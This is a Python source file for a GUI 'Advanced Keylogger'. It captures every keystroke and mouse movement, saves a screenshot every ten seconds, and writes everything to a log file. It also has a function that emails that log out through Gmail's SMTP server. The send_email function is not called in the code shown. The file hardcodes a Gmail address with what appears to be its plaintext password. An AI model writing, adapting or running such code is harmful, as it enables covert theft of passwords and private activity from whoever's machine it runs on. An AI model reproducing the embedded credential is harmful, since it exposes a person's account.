import os
import time
import threading
import pyautogui
import smtplib
from pynput import keyboard, mouse
from tkinter import Tk, Text, Scrollbar, Label, filedialog
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Log file
log_file = "logs.txt"

# GUI setup
root = Tk()
root.title("Advanced Keylogger")
root.geometry("600x400")

# Labels
Label(root, text="Keyboard Input").grid(row=0, column=0)
Label(root, text="Mouse Movement").grid(row=0, column=1)
Label(root, text="Screenshots").grid(row=0, column=2)

# Textboxes
keyboard_text = Text(root, width=20, height=15)
keyboard_text.grid(row=1, column=0)
mouse_text = Text(root, width=20, height=15)
mouse_text.grid(row=1, column=1)
screenshot_text = Text(root, width=20, height=15)
screenshot_text.grid(row=1, column=2)

# Scrollbars
scroll1 = Scrollbar(root, command=keyboard_text.yview)
keyboard_text.config(yscrollcommand=scroll1.set)
scroll2 = Scrollbar(root, command=mouse_text.yview)
mouse_text.config(yscrollcommand=scroll2.set)
scroll3 = Scrollbar(root, command=screenshot_text.yview)
screenshot_text.config(yscrollcommand=scroll3.set)

# Function to log data
def write_log(data):
    with open(log_file, "a") as f:
        f.write(data + "\n")

# Keyboard logger
def on_key_press(key):
    key = str(key).replace("'", "")
    keyboard_text.insert('end', key + "\n")
    keyboard_text.see("end")
    write_log("[KEYBOARD] " + key)

# Mouse movement logger
def on_move(x, y):
    data = f"Mouse moved to ({x}, {y})"
    mouse_text.insert('end', data + "\n")
    mouse_text.see("end")
    write_log("[MOUSE] " + data)

# Screenshot function
def take_screenshot():
    count = 1
    while True:
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(os.getcwd(), f"screenshot_{count}.png")
        screenshot.save(screenshot_path)
        screenshot_text.insert('end', f"Screenshot {count} taken\n")
        screenshot_text.see("end")
        write_log(f"[SCREENSHOT] Screenshot {count} saved")
        count += 1
        time.sleep(10)  


# Email function
def send_email():
    sender_email = "prateekahlawat30@gmail.com"
    receiver_email = "prateekahlawat30@gmail.com"
    password = "@munmun10"
    
    with open(log_file, "r") as f:
        message_content = f.read()
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Keylogger Logs"
    msg.attach(MIMEText(message_content, 'plain'))
    
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()

# Start threads
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_move=on_move)
screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)

keyboard_listener.start()
mouse_listener.start()
screenshot_thread.start()

# Stop function
def stop_logger():
    keyboard_listener.stop()
    mouse_listener.stop()
    root.quit()

# Stop button
stop_button = Label(root, text="STOP", fg="red", font=("Arial", 14), cursor="hand2")
stop_button.grid(row=2, column=1)
stop_button.bind("<Button-1>", lambda e: stop_logger())


root.mainloop()